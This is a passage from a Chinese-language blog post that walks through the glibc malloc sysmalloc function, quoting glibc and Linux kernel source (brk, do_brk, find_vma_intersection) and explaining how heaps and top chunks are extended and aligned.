</span>h;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先对需要分配的内存大小size做相应的调整。<code>aligned_heap_area</code>表示上一次<code>MMAP</code>分配后的结束地址，如果存在，就首先尝试从该地址分配大小为<code>HEAP_MAX_SIZE</code>的内存。<code>MMAP</code>最后是系统调用，对应的内核函数在《malloc源码分析—2》中已经介绍过了，这里只是一些标志位的区别。分配完后，会检查地址是否对齐，如果不对齐也是失败。<br>如果第一次分配失败了，就会再尝试一次，这次分配<code>HEAP_MAX_SIZE*2</code>大小的内存，并且新内存的起始地址由内核决定。因为尝试分配了<code>HEAP_MAX_SIZE*2</code>大小的内存，其中必定包含了大小为<code>HEAP_MAX_SIZE</code>且和<code>HEAP_MAX_SIZE</code>对齐的内存，因此一旦分配成功，就从中截取出这部分内存。<br>如果连第二次也分配失败了，就会通过<code>MMAP</code>进行第三次分配，这次只分配<code>HEAP_MAX_SIZE</code>大小的内存，并且起始地址由内核决定，如果又失败了就返回0。<br>如果三面三次分配内存任何一次成功，就设置相应的可读写位置，并且返回分配区的<code>heap_info</code>指针。</p><p>重新回到<code>sysmalloc</code>中，假设分配成功，就会对刚刚分配得到的heap做相应的设置，其中<code>ar_ptr</code>表示所属的分配区的指针，<code>prev</code>表示上一个heap，所有的heap通过<code>prev</code>形成单向链表，然后通过<code>set_head</code>设置av分配区top chunk的<code>size</code>，这里也可以看出，对于刚分配的heap，包含了<code>heap_info</code>指针、top chunk、以及大于size的未被使用的部分。<br>再接下来就要对原来的top chunk进行最后的处理，这里假设对齐，如果原top chunk的大小不够大，就将其分割成<code>old_size + 2 * SIZE_SZ</code>和<code>2 * SIZE_SZ</code>大小；如果原top chunk的大小足够大，就将其分割成<code>old_size</code>，<code>2 * SIZE_SZ</code>和<code>2 * SIZE_SZ</code>大小，并通过<code>_int_free</code>进行释放。</p><h2 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h2><p>继续往下看<code>sysmalloc</code>，上面一部分代码主要是针对非主分配区的操作，下面的这段代码就是针对主分配区的操作了。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> * <span class="hljs-title">sysmalloc</span><span class="hljs-params">(INTERNAL_SIZE_T nb, mstate av)</span> </span>&#123;<br><br>    ...<br><br>    <span class="hljs-keyword">if</span> (av != &amp;main_arena) &#123;<br><br>        ...<br><br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        size = nb + mp_.top_pad + MINSIZE;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">contiguous</span>(av))<br>            size -= old_size;<br>        size = <span class="hljs-built_in">ALIGN_UP</span>(size, pagesize);<br><br>        <span class="hljs-keyword">if</span> (size &gt; <span class="hljs-number">0</span>) &#123;<br>            brk = (<span class="hljs-type">char</span> *) (<span class="hljs-built_in">MORECORE</span>(size));<br>            <span class="hljs-built_in">LIBC_PROBE</span> (memory_sbrk_more, <span class="hljs-number">2</span>, brk, size);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (brk != (<span class="hljs-type">char</span> *) (MORECORE_FAILURE)) &#123;<br>            <span class="hljs-built_in">void</span> (*hook)(<span class="hljs-type">void</span>) = <span class="hljs-built_in">atomic_forced_read</span> (__after_morecore_hook);<br>            <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>            (*hook)();<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">contiguous</span> (av))<br>                size = <span class="hljs-built_in">ALIGN_UP</span> (size + old_size, pagesize);<br><br>            <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (MMAP_AS_MORECORE_SIZE))<br>                size = MMAP_AS_MORECORE_SIZE;<br><br>            <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb))&#123;<br>                <span class="hljs-type">char</span> *mbrk = (<span class="hljs-type">char</span> *) (<span class="hljs-built_in">MMAP</span> (<span class="hljs-number">0</span>, size, PROT_READ | PROT_WRITE, <span class="hljs-number">0</span>));<br><br>                <span class="hljs-keyword">if</span> (mbrk != MAP_FAILED)&#123;<br>                    brk = mbrk;<br>                    snd_brk = brk + size;<br>                    <span class="hljs-built_in">set_noncontiguous</span> (av);<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        ...<br><br>    &#125;<br><br>    ...<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>MORECORE</code>是一个宏定义，其最终是通过系统调用分配内存，定义在linux内核的mmap.c文件中，</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs xl">SYSCALL_DEFINE1(brk, unsigned long, brk)&#123;<br><br>    unsigned long retval;<br>    unsigned long newbrk, oldbrk;<br>    <span class="hljs-function"><span class="hljs-title">struct</span> mm_struct *mm = current-&gt;</span>mm;<br>    unsigned long min_brk;<br>    bool populate;<br><br>    <span class="hljs-function"><span class="hljs-title">down_write</span>(&amp;mm-&gt;</span>mmap_sem);<br>    <span class="hljs-function"><span class="hljs-title">min_brk</span> = mm-&gt;</span>start_brk;<br>    <span class="hljs-keyword">if</span> (brk &lt; min_brk)<br>        goto out;<br><br>    <span class="hljs-function"><span class="hljs-title">if</span> (check_data_rlimit(rlimit(RLIMIT_DATA), brk, mm-&gt;</span>start_brk,<br>                  <span class="hljs-function"><span class="hljs-title">mm</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">end_data</span>, mm-&gt;</span>start_data))<br>        goto out;<br><br>    newbrk = PAGE_ALIGN(brk);<br>    <span class="hljs-function"><span class="hljs-title">oldbrk</span> = PAGE_ALIGN(mm-&gt;</span>brk);<br>    <span class="hljs-keyword">if</span> (oldbrk == newbrk)<br>        goto set_brk;<br><br>    <span class="hljs-function"><span class="hljs-title">if</span> (brk &lt;= mm-&gt;</span>brk) &#123;<br>        <span class="hljs-keyword">if</span> (!do_munmap(mm, newbrk, oldbrk-newbrk))<br>            goto set_brk;<br>        goto out;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (find_vma_intersection(mm, oldbrk, newbrk+PAGE_SIZE))<br>        goto out;<br><br>    <span class="hljs-keyword">if</span> (do_brk(oldbrk, newbrk-oldbrk) != oldbrk)<br>        goto out;<br><br>set_brk:<br>    <span class="hljs-function"><span class="hljs-title">mm</span>-&gt;</span>brk = brk;<br>    <span class="hljs-function"><span class="hljs-title">populate</span> = newbrk &gt; oldbrk &amp;&amp; (mm-&gt;</span>def_flags &amp; VM_LOCKED) != <span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-title">up_write</span>(&amp;mm-&gt;</span>mmap_sem);<br>    <span class="hljs-keyword">if</span> (populate)<br>        mm_populate(oldbrk, newbrk - oldbrk);<br>    return brk;<br><br>out:<br>    <span class="hljs-function"><span class="hljs-title">retval</span> = mm-&gt;</span>brk;<br>    <span class="hljs-function"><span class="hljs-title">up_write</span>(&amp;mm-&gt;</span>mmap_sem);<br>    return retval;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先会对传入堆的新地址<code>brk</code>做一些检查，然后该新地址小于原本的<code>brk</code>，就需要通过<code>do_munmap</code>释放虚拟内存，以减少堆的大小；反之，就通过<code>do_brk</code>增加堆得大小。其中<code>find_vma_intersection</code>用来判断增加堆空间后，是否会占用已经被分配的虚拟内存，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">vm_area_struct</span> * <span class="hljs-built_in">find_vma_intersection</span>(<span class="hljs-keyword">struct</span> mm_struct * mm, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start_addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> end_addr)&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">vm_area_struct</span> * vma = <span class="hljs-built_in">find_vma</span>(mm,start_addr);<br><br>    <span class="hljs-keyword">if</span> (vma &amp;&amp; end_addr &lt;= vma-&gt;vm_start)<br>        vma = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> vma;<br>&#125;<br></code></pre></td></tr></table></figure><p>因为是增加堆的大小，因此只需要关心<code>do_brk</code>函数，</p><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs zephir"><span class="hljs-keyword">static</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> do_brk(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> addr, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> len)&#123;<br><br>    struct mm_struct *mm = current-&gt;mm;<br>    struct vm_area_struct *vma, *prev;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> flags;<br>    struct rb_node **rb_link, *rb_parent;<br>    pgoff_t pgoff = addr &gt;&gt; PAGE_SHIFT;<br>    <span class="hljs-keyword">int</span> error;<br><br>    len = PAGE_ALIGN(len);<br>    <span class="hljs-keyword">if</span> (!len)<br>        <span class="hljs-keyword">return</span> addr;<br><br>    flags = VM_DATA_DEFAULT_FLAGS | VM_ACCOUNT | mm-&gt;def_flags;<br><br>    error = get_unmapped_area(NULL, addr, len, <span class="hljs-number">0</span>, MAP_FIXED);<br>    <span class="hljs-keyword">if</span> (error &amp; ~PAGE_MASK)<br>        <span class="hljs-keyword">return</span> error;<br><br>    error = mlock_future_check(mm, mm-&gt;def_flags, len);<br>    <span class="hljs-keyword">if</span> (error)<br>        <span class="hljs-keyword">return</span> error;<br><br>    verify_mm_writelocked(mm);<br><br>    <span class="hljs-keyword">while</span> (find_vma_links(mm, addr, addr + len, &amp;prev, &amp;rb_link,<br>                  &amp;rb_parent)) &#123;<br>        <span class="hljs-keyword">if</span> (do_munmap(mm, addr, len))<br>            <span class="hljs-keyword">return</span> -ENOMEM;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!may_expand_vm(mm, len &gt;&gt; PAGE_SHIFT))<br>        <span class="hljs-keyword">return</span> -ENOMEM;<br><br>    <span class="hljs-keyword">if</span> (mm-&gt;map_count &gt; sysctl_max_map_count)<br>        <span class="hljs-keyword">return</span> -ENOMEM;<br><br>    <span class="hljs-keyword">if</span> (security_vm_enough_memory_mm(mm, len &gt;&gt; PAGE_SHIFT))<br>        <span class="hljs-keyword">return</span> -ENOMEM;<br><br>    vma = vma_merge(mm, prev, addr, addr + len, flags,<br>                    NULL, NULL, pgoff, NULL);<br>    <span class="hljs-keyword">if</span> (vma)<br>        goto out;<br><br>    vma = kmem_cache_zalloc(vm_area_cachep, GFP_KERNEL);<br>    <span class="hljs-keyword">if</span> (!vma) &#123;<br>        vm_unacct_memory(len &gt;&gt; PAGE_SHIFT);<br>        <span class="hljs-keyword">return</span> -ENOMEM;<br>    &#125;<br><br>    INIT_LIST_HEAD(&amp;vma-&gt;anon_vma_chain);<br>    vma-&gt;vm_mm = mm;<br>    vma-&gt;vm_start = addr;<br>    vma-&gt;vm_end = addr + len;<br>    vma-&gt;vm_pgoff = pgoff;<br>    vma-&gt;vm_flags = flags;<br>    vma-&gt;vm_page_prot = vm_get_page_prot(flags);<br>    vma_link(mm, vma, prev, rb_link, rb_parent);<br>out:<br>    perf_event_mmap(vma);<br>    mm-&gt;total_vm += len &gt;&gt; PAGE_SHIFT;<br>    <span class="hljs-keyword">if</span> (flags &amp; VM_LOCKED)<br>        mm-&gt;locked_vm += (len &gt;&gt; PAGE_SHIFT);<br>    vma-&gt;vm_flags |= VM_SOFTDIRTY;<br>    <span class="hljs-keyword">return</span> addr;<br>&#125;<br></code></pre></td></tr></table></figure><p>这段代码和第二章中分析的<code>mmap_region</code>函数很类似，这里简单分析如下，<code>get_unmapped_area</code>用来检查需要分配的虚拟内存地址是否已经被使用，<code>find_vma_links</code>用来查找需要插入的虚拟内存在红黑树的位置，<code>may_expand_vm</code>用来检查虚拟内存是否会超过系统的限制，<code>vma_merge</code>用来合并虚拟内存，如果不能合并，就通过slab分配一个<code>vma</code>，进行相应的设置，并通过<code>vma_link</code>插入到进程的红黑树中。</p><p>从linux的代码中回来，继续看<code>sysmalloc</code>，假设分配成功，会查找是否有<code>__after_morecore_hook</code>函数并执行，这里假设该函数指针为null。<br>假设分配失败，则进入<code>else</code>部分，首先对需要分配的大小按地址对齐，并且设置分配<code>size</code>的最小值为<code>MMAP_AS_MORECORE_SIZE</code>（1MB），然后通过<code>MMAP</code>宏分配内存，该函数已经在《malloc源码分析—2》分析过了。这里注意，如果是通过mmap分配的内存，则设置分配区为不连续标志位。</p><h2 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h2><p>继续往下看sysmalloc，</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> * <span class="hljs-title">sysmalloc</span><span class="hljs-params">(INTERNAL_SIZE_T nb, mstate av)</span> </span>&#123;<br><br>    ...<br><br>    <span class="hljs-keyword">if</span> (av != &amp;main_arena) &#123;<br><br>        ...<br><br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br><br>        ...<br><br>        <span class="hljs-keyword">if</span> (brk != (<span class="hljs-type">char</span> *) (MORECORE_FAILURE)) &#123;<br>            <span class="hljs-keyword">if</span> (mp_.sbrk_base == <span class="hljs-number">0</span>)<br>                mp_.sbrk_base = brk;<br>            av-&gt;system_mem += size;<br><br>            <span class="hljs-keyword">if</span> (brk == old_end &amp;&amp; snd_brk == (<span class="hljs-type">char</span> *) (MORECORE_FAILURE))<br>                <span class="hljs-built_in">set_head</span>(old_top, (size + old_size) | PREV_INUSE);<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">contiguous</span> (av) &amp;&amp; old_size &amp;&amp; brk &lt; old_end) &#123;<br>                <span class="hljs-built_in">malloc_printerr</span>(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;break adjusted to free malloc space&quot;</span>, brk, av);<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                front_misalign = <span class="hljs-number">0</span>;<br>                end_misalign = <span class="hljs-number">0</span>;<br>                correction = <span class="hljs-number">0</span>;<br>                aligned_brk = brk;<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">contiguous</span>(av)) &#123;<br>                    <span class="hljs-keyword">if</span> (old_size)<br>                        av-&gt;system_mem += brk - old_end;<br><br>                    front_misalign = (INTERNAL_SIZE_T) <span class="hljs-built_in">chunk2mem</span>(<br>                            brk) &amp; MALLOC_ALIGN_MASK;<br>                    <span class="hljs-keyword">if</span> (front_misalign &gt; <span class="hljs-number">0</span>) &#123;<br>                        correction = MALLOC_ALIGNMENT - front_misalign;<br>                        aligned_brk += correction;<br>                    &#125;<br><br>                    correction += old_size;<br>                    end_misalign = (INTERNAL_SIZE_T) (brk + size + correction);<br>                    correction += (<span class="hljs-built_in">ALIGN_UP</span>(end_misalign, pagesize)) - end_misalign;<br><br>                    <span class="hljs-built_in">assert</span>(correction &gt;= <span class="hljs-number">0</span>);<br>                    snd_brk = (<span class="hljs-type">char</span> *) (<span class="hljs-built_in">MORECORE</span>(correction));<br><br>                    <span class="hljs-keyword">if</span> (snd_brk == (<span class="hljs-type">char</span> *) (MORECORE_FAILURE)) &#123;<br>                        correction = <span class="hljs-number">0</span>;<br>                        snd_brk = (<span class="hljs-type">char</span> *) (<span class="hljs-built_in">MORECORE</span>(<span class="hljs-number">0</span>));<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-built_in">void</span> (*hook)(<br>                        <span class="hljs-type">void</span>) = <span class="hljs-built_in">atomic_forced_read</span> (__after_morecore_hook);<br>                        <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>                        (*hook)();<br>                    &#125;<br>                &#125;<br><br>                ...<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    ...<br><br>&#125;<br></code></pre></td></tr></table></figure><p>假设增加了主分配区的top chunk成功，则更新<code>sbrk_base</code>和分配区已分配的内存大小。<br>然后，第一个判断表示，新分配的内存地址和原来的<code>top chunk</code>连续，并且不是通过<code>MMAP</code>分配的，这时只需要更新原来top chunk的大小<code>size</code>。<br>第二个判断表示如果分配区的连续标志位置位，top chunk的大小大于0，但是分配的<code>brk</code>小于原来的top chunk结束地址，这里就判定出错了。<br>进入第三个判断表示新分配的内存地址大于原来的top chunk的结束地址，但是不连续。这种情况下，如果分配区的连续标志位置位，则表示不是通过MMAP分配的，肯定有其他线程调用了<code>brk</code>在堆上分配了内存，<code>av-&gt;system_mem += brk - old_end</code>表示将其他线程分配的内存一并计入到该分配区分配的内存大小。然后将刚刚分配的地址<code>brk</code>按<code>MALLOC_ALIGNMENT</code>对齐。<br>再往下就要处理地址不连续的问题了，因为地址不连续，就要放弃原来top chunk后面一部分的内存大小，并且将这一部分内存大小“补上”到刚刚分配的新内存后面。首先计算堆上补上内存后的结束地址并保存在<code>correction</code>中，然后调用<code>MORECORE</code>继续分配一次，将新分配内存的开始地址保存在<code>snd_brk</code>中。如果分配失败，则将<code>correction</code>设为0，并将<code>snd_brk</code>重置为原来分配的内存的结束地址，表示放弃该次补偿操作；如果分配成功，就调用<code>__after_morecore_hook</code>函数，这里假设该函数指针为<code>null</code>。</p><h2 id="第四部分"><a href="#第四部分" class="headerlink" title="第四部分"></a>第四部分</h2><p>继续往下看sysmalloc，</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs markdown">static void * sysmalloc(INTERNAL<span class="hljs-emphasis">_SIZE_</span>T nb, mstate av) &#123;<br><br><span class="hljs-code">    ...</span><br><span class="hljs-code"></span><br><span class="hljs-code">    if (av != &amp;main_arena) &#123;</span><br><span class="hljs-code"></span><br><span class="hljs-code">        ...</span><br><span class="hljs-code"></span><br><span class="hljs-code">    &#125;</span><br><span class="hljs-code">    else&#123;</span><br><span class="hljs-code"></span><br><span class="hljs-code">        ...</span><br><span class="hljs-code"></span><br><span class="hljs-code">        if (brk != (char *) (MORECORE_FAILURE)) &#123;</span><br><span class="hljs-code"></span><br><span class="hljs-code">            ...</span><br><span class="hljs-code"></span><br><span class="hljs-code">            if (brk == old_end &amp;&amp; snd_brk == (char *) (MORECORE_FAILURE))</span><br><span class="hljs-code">                ...</span><br><span class="hljs-code">            else if (contiguous (av) &amp;&amp; old_size &amp;&amp; brk &lt; old_end) &#123;</span><br><span class="hljs-code">                ...</span><br><span class="hljs-code">            &#125;</span><br><span class="hljs-code">            else &#123;</span><br><span class="hljs-code"></span><br><span class="hljs-code">                ...</span><br><span class="hljs-code"></span><br><span class="hljs-code">                if (contiguous(av)) &#123;</span><br><span class="hljs-code"></span><br><span class="hljs-code">                    ...</span><br><span class="hljs-code"></span><br><span class="hljs-code">                &#125;</span><br><span class="hljs-code"></span><br><span class="hljs-code">                else&#123;</span><br><span class="hljs-code">                    if (MALLOC_ALIGNMENT == 2 * SIZE_SZ)</span><br><span class="hljs-code">                    assert (((unsigned long) chunk2mem (brk) &amp; MALLOC_ALIGN_MASK) == 0);</span><br><span class="hljs-code">                    else&#123;</span><br><span class="hljs-code">                        front_misalign = (INTERNAL_SIZE_T) chunk2mem (brk) &amp; MALLOC_ALIGN_MASK;</span><br><span class="hljs-code">                        if (front_misalign &gt; 0)&#123;</span><br><span class="hljs-code">                            aligned_brk += MALLOC_ALIGNMENT - front_misalign;</span><br><span class="hljs-code">                        &#125;</span><br><span class="hljs-code">                    &#125;</span><br><span class="hljs-code"></span><br><span class="hljs-code">                    if (snd_brk == (char *) (MORECORE_FAILURE))&#123;</span><br><span class="hljs-code">                        snd_brk = (char *) (MORECORE (0));</span><br><span class="hljs-code">                    &#125;</span><br><span class="hljs-code">                &#125;</span><br><span class="hljs-code"></span><br><span class="hljs-code">                if (snd_brk != (char *) (MORECORE_FAILURE)) &#123;</span><br><span class="hljs-code">                    av-&gt;top = (mchunkptr) aligned_brk;</span><br><span class="hljs-code">                    set_head(av-&gt;top,</span><br><span class="hljs-code">                            (snd_brk - aligned_brk + correction) | PREV_INUSE);</span><br><span class="hljs-code">                    av-&gt;system_mem += correction;</span><br><span class="hljs-code"></span><br><span class="hljs-code">                    if (old_size != 0) &#123;</span><br><span class="hljs-code">                        old_size = (old_size - 4 * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK;</span><br><span class="hljs-code">                        set_head(old_top, old_size | PREV_INUSE);</span><br><span class="hljs-code"></span><br><span class="hljs-code">                        chunk_at_offset (old_top, old_size)-&gt;size = (2 * SIZE_SZ)</span><br><span class="hljs-code">                                | PREV_INUSE;</span><br><span class="hljs-code"></span><br><span class="hljs-code">                        chunk_at_offset (old_top, old_size + 2 * SIZE_SZ)-&gt;size = (2</span><br><span class="hljs-code">                                * SIZE_SZ) | PREV_INUSE;</span><br><span class="hljs-code"></span><br><span class="hljs-code">                        if (old_size &gt;= MINSIZE) &#123;</span><br><span class="hljs-code">                            _int_free(av, old_top, 1);</span><br><span class="hljs-code">                        &#125;</span><br><span class="hljs-code">                    &#125;</span><br><span class="hljs-code">                &#125;</span><br><span class="hljs-code">            &#125;</span><br><span class="hljs-code">        &#125;</span><br><span class="hljs-code">    &#125;</span><br><span class="hljs-code"></span><br><span class="hljs-code">    ...</span><br><span class="hljs-code"></span><br>&#125;<br></code></pre></td></tr></table></figure><p>开头的<code>else</code>表示分配区的连续标志没有置位，这时只要按照<code>MALLOC_ALIGNMENT</code>做简单的对齐就行了，如果是通过<code>brk</code>分配的内存，则通过<code>MORECORE (0)</code>得到新分配的内存的结束地址并保存在<code>snd_brk</code>中。<br>再往下进入<code>if</code>，设置分配区的top指针为经过对齐之后的起始地址<code>aligned_brk</code>，设置top chunk的大小<code>size</code>，<code>aligned_brk</code>表示对齐造成的误差，<code>correction</code>是因为要补偿原来top chunk剩余内存造成的误差，然后设置分配区已分配的内存大小。<br>因为不连续，最后<code>if</code>内是设置原top chunk的<code>fencepost</code>，将原来top chunk的剩余空间拆成两个<code>SIZE_SZ*2</code>大小的chunk，如果剩下的大小大于可分配的chunk的最小值<code>MINSIZE</code>，就通过<code>_int_free</code>释放掉整个剩余内存。</p><h2 id="第五部分"><a href="#第五部分" class="headerlink" title="第五部分"></a>第五部分</h2><p>继续往下看sysmalloc最后一部分，</p><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span 